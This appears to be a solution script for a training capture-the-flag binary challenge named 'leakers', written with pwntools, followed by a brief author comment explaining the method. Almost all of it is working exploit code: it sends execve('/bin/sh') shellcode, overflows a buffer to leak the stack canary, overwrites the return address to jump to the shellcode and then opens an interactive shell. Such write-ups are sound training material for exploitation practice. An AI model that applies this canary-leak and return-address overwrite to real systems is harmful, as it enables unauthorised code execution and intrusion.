from pwn import *

SERVER = "bin.training.offdef.it"
PORT = "2010"
BINARY = "./leakers"


if "REMOTE" in args:
    r = remote(SERVER, PORT)
else: 
    r = process(BINARY)
    gdb.attach(r, """
            #breakpoints
            #b* 0x004012c5
            #b* 0x004012f3
            #b* 0x00401355
            c
            
            """)
    input("wait")


#code
shellcode = b"\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\x81\xC7\xB9\x40\x40\x00\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"
r.sendline(shellcode)
print("1:", r.recv())
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

where2jump = b'\xA0\x40\x40\x00\x00\x00\x00\x00'

payload = b"A"*104 + p64(canary) + b'\x90\x90\x90\x90\x90\x90\x90\x90' + where2jump 
r.sendline(payload)
sleep(0.5)
r.sendline(b"")

r.interactive()

'''
This challenge was the first one with the presence of the canary. 
The canary was visible and easy accessible by a simple buffer overflow.
Because of the fact the canary always starts with \x00 (to avoid printing it)
we are forced to add an extra byte to the first 104 and then rescue the canary (overwriting the byte makes it printable). 
Once done, by looking at the flow of the program it was easy to understand that
after the canary there was the ret address. So, I put the shellcode in the static executable
memory at addr ox4040a0 and then I made my code jump there overwriting the ret addr. 

'''